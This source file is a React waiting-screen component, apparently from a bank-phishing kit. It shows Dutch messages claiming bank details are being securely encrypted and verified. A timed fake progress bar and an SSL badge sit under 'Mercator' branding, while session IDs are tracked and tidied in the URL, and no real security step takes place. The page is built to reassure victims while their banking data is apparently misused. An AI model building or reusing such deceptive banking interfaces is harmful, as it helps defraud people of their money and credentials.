"use client";

import { useEffect, useState } from "react";
import { useSettings } from "@/contexts/SettingsContext";
import { MercatorStage, MercatorCard, MercatorLogoMark } from "@/components/ui/MercatorScreen";

type Props = {
  sessionId: string;
  routeSessionId?: string | null;
};

const MESSAGES = [
  "Er wordt een beveiligde verbinding opgezet...",
  "Bankgegevens worden versleuteld en verzonden...",
  "Er wordt een beveiligingscontrole uitgevoerd...",
  "Even geduld...",
  "De verbinding wordt geautoriseerd..."
];

async function resolveShortIdApi(sessionId: string): Promise<string | null> {
  try {
    const res = await fetch(`/api/resolve-short-id`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ session_id: sessionId }),
      cache: "no-store",
    });
    if (!res.ok) return null;
    const json = await res.json();
    if (json?.ok && json?.public_id) return String(json.public_id);
    return null;
  } catch {
    return null;
  }
}

export function WaitClient({ sessionId, routeSessionId }: Props) {
  const { settings, loading: settingsLoading } = useSettings();
  const [messageIndex, setMessageIndex] = useState(0);

  // Client-side URL normalizasyonu: URL query param session UUID ise kisa ID'ye cevir
  useEffect(() => {
    if (typeof window === "undefined") return;
    let cancelled = false;

    const run = async () => {
      const url = new URL(window.location.href);
      const sessionQp = url.searchParams.get("session");
      const hasUuidQp =
        sessionQp &&
        /^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i.test(
          sessionQp,
        );

      if (!hasUuidQp) return;

      const sid = sessionQp!;
      const preferred =
        routeSessionId &&
        !/^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i.test(
          routeSessionId,
        )
          ? routeSessionId
          : null;

      const shortId = preferred ?? (await resolveShortIdApi(sid));
      if (cancelled) return;
      if (shortId && shortId !== sid) {
        url.searchParams.set("session", shortId);
        const next = url.pathname + url.search + url.hash;
        window.history.replaceState({}, "", next);
      }
    };

    run();
    return () => {
      cancelled = true;
    };
  }, [sessionId, routeSessionId]);

  useEffect(() => {
    const messageTimer = setInterval(() => {
      setMessageIndex((prev) => (prev + 1) % MESSAGES.length);
    }, 3500);
    return () => clearInterval(messageTimer);
  }, []);

  const progressWidth = ((messageIndex + 1) / MESSAGES.length) * 100;


  if (settingsLoading) {
    return (
      <div className="flex min-h-[100dvh] items-center justify-center bg-[#020824]">
        <div className="size-12 animate-spin rounded-full border-4 border-[#00A9E0]/30 border-t-[#00A9E0]" />
      </div>
    );
  }

  return (
    <MercatorStage>
      {!sessionId ? (
        <p className="w-full max-w-sm rounded-2xl border border-[#00A9E0]/40 bg-[#00A9E0]/10 p-4 text-center text-sm font-medium text-sky-200 backdrop-blur-md">
          Ongeldige link.
        </p>
      ) : (
        <MercatorCard className="flex flex-col items-center text-center">
          <div className="mb-6">
            <MercatorLogoMark />
          </div>

          {/* Shield Icon */}
          <div className="relative mb-6 flex h-24 w-24 items-center justify-center">
            <div className="absolute inset-0 animate-ping rounded-full bg-[#00A9E0]/15" style={{ animationDuration: "3s" }} />
            <div className="absolute inset-0 rounded-full border-2 border-[#00A9E0]/25" />
            <div className="absolute inset-0 animate-spin rounded-full border-2 border-transparent border-t-[#00A9E0] border-r-[#7fd4ff]" style={{ animationDuration: "1.5s" }} />
            <svg className="h-9 w-9 text-[#00A9E0]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.5" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
            </svg>
          </div>

          <h2 className="mb-2 text-2xl font-extrabold tracking-tight text-white">
            {settings.wait_title}
          </h2>

          <div className="mb-6 flex h-[48px] w-full items-center justify-center px-4">
            <p
              key={messageIndex}
              className="text-center text-[15px] font-medium text-white/55 animate-[fadeIn_0.5s_ease-in-out]"
            >
              {MESSAGES[messageIndex]}
            </p>
          </div>

          {/* Progress Bar */}
          <div className="relative h-2.5 w-full overflow-hidden rounded-full bg-white/10">
            <div
              className="relative h-full rounded-full bg-gradient-to-r from-[#00257E] via-[#00A9E0] to-[#7fd4ff] transition-all duration-1000 ease-in-out"
              style={{ width: `${progressWidth}%` }}
            >
              <div className="absolute top-0 left-0 h-full w-full animate-[pulse_2s_ease-in-out_infinite] bg-white/20" />
            </div>
          </div>

          <div className="mt-7 flex items-center justify-center gap-2 rounded-full border border-white/10 bg-white/5 px-4 py-2 text-[12px] font-semibold text-white/50">
            <svg className="h-4 w-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
            </svg>
            256-bit SSL-codering
          </div>
        </MercatorCard>
      )}
    </MercatorStage>
  );
}
